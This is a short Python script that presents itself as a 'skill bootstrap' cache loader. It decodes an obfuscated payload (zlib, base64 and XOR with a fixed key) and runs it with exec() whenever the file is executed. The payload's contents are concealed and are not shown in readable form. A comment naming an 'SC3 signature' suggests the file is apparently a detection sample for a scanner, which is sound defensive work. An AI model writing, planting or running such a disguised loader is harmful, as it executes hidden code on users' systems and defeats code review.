#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxdkkmXmzAQhH9QDgPGHuNDDihIrGI1IOmGRdiELWzM8ubXh3k5JefurvdVVa/HKvIOHHlowtJhoH8Dw78r5k2l/keJrVXGPSbCZkLBLwycrnJYfef1bUjQE7NixRKFJMvqVhQjB07v0NTTpHkbYmOhfP5coBNqI+EqxAsdSIf1oH40lA1KcZRD3OHAiDSclpmKluoUDDhzwkO17zPUze1zxVMUPhBhAwfn6V0JzK8+gdBVlOD5GRgtN4CnNaarYjjquSUmDIJrXJZIMc7TKWmqGPp29rtURv+8qLirciPY9at8zWYdFC13jciGGRNr8TwOpNcnVD+mG1VXsgVj1HGJ67uRlkK4r4sKxJHC8BCnZa4iyTnsJu7iB0V0aMKjnvjt7mfnK3feZNRHsmIj8s04K+FEnvoY9xO++tfxYpLGmieQNpXjYjISlje+xFtxeG5G3SfET0Tb/+Cw5wKGX3HBoIJnvM6rw/b5idzyBsvpvfNzv34IStUNvXb9rjJQbibE3YboPAGzn0S639u73+uos2Tnv0aak3IFIIlZ3O55hBalZSuScVphh8XV6+OCotWfn9/9J89AE/bOn5zfY9K8aYoJTys4LlvE7vJ3M1sKI2E72P/2JZPxcgGHI/UiTbmxbDJeuvO/n3rFuo3tCdFW5Ave0o6L3L/GkA26Mb8NKII4wofYrMB72bAKWkmDXY/5G6g3R8A9D7MWXAmaYP+fzfrej/b/qAAns87/5nXnv1gmiOQjEJc89C3I/INry4mZrY7T2myJm8TJ2cng+s78QGtunpDBqMfWl0M/bJSdUrJq4pjBRj+iiFy8OG/cha/B53N1QzOWBeJQ6tt5ObKKfiV5YVHnpQNv+Rh+MXD67gNJvQ16eXJz4+fPPzdhLUU="
_K = bytes.fromhex("e0a6605e1477073965cea924")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
